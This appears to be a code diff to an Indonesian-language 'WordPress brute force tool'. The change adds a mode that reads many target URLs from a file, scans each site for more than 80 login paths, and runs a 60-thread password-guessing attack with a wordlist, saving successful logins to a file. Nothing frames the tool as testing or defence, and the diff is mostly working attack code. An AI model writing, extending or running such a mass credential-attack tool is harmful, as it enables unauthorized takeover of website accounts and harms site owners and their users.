@@ -9,12 +9,13 @@ init(autoreset=True)
 
 # Configuration
 PASSWORD_FILE = "password.txt"  # Local password file
+TARGET_FILE = "urltarget.txt"   # File containing multiple targets
 SAVE_FILE = "success.txt"
-MAX_THREADS = 60  # Increased threads for faster scanning
+MAX_THREADS = 60
 TIMEOUT = 5
-DELAY = 0.05  # Reduced delay for faster scanning
+DELAY = 0.05
 
-# 80+ WordPress login paths (optimized order)
+# 80+ WordPress login paths (keep all paths as requested)
 WP_LOGIN_PATHS = [
     "/wp-login.php", "/wp-admin", "/login", "/admin",
     "/wp/wp-login.php", "/wordpress/wp-login.php", "/blog/wp-login.php",
@@ -38,24 +39,21 @@ WP_LOGIN_PATHS = [
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
 
-def load_password_file():
-    """Load passwords from local password.txt file"""
+def load_wordlist(filename):
     try:
-        with open(PASSWORD_FILE, 'r') as f:
+        with open(filename, 'r') as f:
             return [line.strip() for line in f if line.strip()]
     except FileNotFoundError:
-        print(f"{Fore.RED}[!] File password.txt tidak ditemukan!{Style.RESET_ALL}")
+        print(f"{Fore.RED}[!] File {filename} tidak ditemukan!{Style.RESET_ALL}")
         return None
 
 def normalize_url(url):
-    """Normalize URL input (supports https://contoh.com and contoh.com)"""
     url = url.strip()
     if not url.startswith(('http://', 'https://')):
         url = 'http://' + url
     return url.split('?')[0].rstrip('/')
 
 def detect_wp_login(base_url):
-    """Fast parallel login page detection"""
     with ThreadPoolExecutor(max_workers=30) as executor:
         futures = {executor.submit(check_path, base_url, path): path for path in WP_LOGIN_PATHS}
         for future in as_completed(futures):
@@ -79,7 +77,6 @@ def check_path(base_url, path):
     return None
 
 def brute_force(target, creds):
-    """Optimized brute force with session reuse"""
     username, password = creds
     try:
         with requests.Session() as session:
@@ -106,7 +103,7 @@ def brute_force(target, creds):
     return False
 
 def single_target_mode():
-    """Mode 1: Single target with manual username"""
+    """Mode 1: Single target with manual username (unchanged)"""
     target = input("\nMasukkan URL target (contoh.com atau https://contoh.com): ").strip()
     username = input("Masukkan username WordPress: ").strip()
     
@@ -124,7 +121,7 @@ def single_target_mode():
     
     print(f"{Fore.GREEN}[+] Login ditemukan: {login_url}{Style.RESET_ALL}")
     
-    passwords = load_password_file()
+    passwords = load_wordlist(PASSWORD_FILE)
     if not passwords:
         return
     
@@ -132,7 +129,6 @@ def single_target_mode():
     start_time = time.time()
     success_count = 0
     
-    # Ultra-fast brute force
     with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
         futures = [executor.submit(brute_force, login_url, (username, p)) for p in passwords]
         for future in as_completed(futures):
@@ -150,11 +146,73 @@ def single_target_mode():
         print(f"{Fore.RED}[-] ANDA GAGAL [HASIL 0]{Style.RESET_ALL}")
     print(f"{Fore.YELLOW}[*] Hasil disimpan di: {SAVE_FILE}{Style.RESET_ALL}")
 
+def multi_target_mode():
+    """Mode 2: Multiple targets from urltarget.txt"""
+    if not os.path.exists(TARGET_FILE):
+        print(f"{Fore.RED}[!] File {TARGET_FILE} tidak ditemukan!{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Buat file {TARGET_FILE} berisi list target (1 per baris){Style.RESET_ALL}")
+        return
+    
+    username = input("\nMasukkan username WordPress untuk semua target: ").strip()
+    if not username:
+        print(f"{Fore.RED}[!] Username harus diisi!{Style.RESET_ALL}")
+        return
+    
+    targets = load_wordlist(TARGET_FILE)
+    if not targets:
+        return
+    
+    passwords = load_wordlist(PASSWORD_FILE)
+    if not passwords:
+        return
+    
+    total_targets = len(targets)
+    success_count = 0
+    
+    print(f"\n{Fore.CYAN}[*] Memulai scan pada {total_targets} target{Style.RESET_ALL}")
+    start_time = time.time()
+    
+    for i, target in enumerate(targets, 1):
+        normalized_url = normalize_url(target)
+        print(f"\n{Fore.YELLOW}[{i}/{total_targets}] Scanning: {normalized_url}{Style.RESET_ALL}")
+        
+        login_url = detect_wp_login(normalized_url)
+        if not login_url:
+            print(f"{Fore.RED}[!] Gagal menemukan halaman login{Style.RESET_ALL}")
+            continue
+        
+        print(f"{Fore.GREEN}[+] Login ditemukan: {login_url}{Style.RESET_ALL}")
+        
+        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+            futures = [executor.submit(brute_force, login_url, (username, p)) for p in passwords]
+            for future in as_completed(futures):
+                if future.result():
+                    success_count += 1
+                time.sleep(DELAY)
+    
+    elapsed = time.time() - start_time
+    print(f"\n{Fore.CYAN}[*] Selesai dalam {elapsed:.2f} detik{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}[*] Total target diproses: {total_targets}{Style.RESET_ALL}")
+    
+    if success_count > 0:
+        print(f"{Fore.GREEN}[+] ANDA SUCCESS [HASIL {success_count}]{Style.RESET_ALL}")
+    else:
+        print(f"{Fore.RED}[-] ANDA GAGAL [HASIL 0]{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[*] Hasil disimpan di: {SAVE_FILE}{Style.RESET_ALL}")
+
 def main():
     clear_screen()
     print(f"\n{Fore.BLUE}=== WORDPRESS BRUTE FORCE TOOL ==={Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}Mode 1: Single Target (Manual Username){Style.RESET_ALL}")
-    single_target_mode()
+    print(f"{Fore.YELLOW}1. Single Target (Manual Username){Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}2. Multi Target (File urltarget.txt){Style.RESET_ALL}")
+    
+    choice = input("\nPilih mode (1/2): ").strip()
+    if choice == "1":
+        single_target_mode()
+    elif choice == "2":
+        multi_target_mode()
+    else:
+        print(f"{Fore.RED}[!] Pilihan tidak valid{Style.RESET_ALL}")
 
 if __name__ == "__main__":
     try:
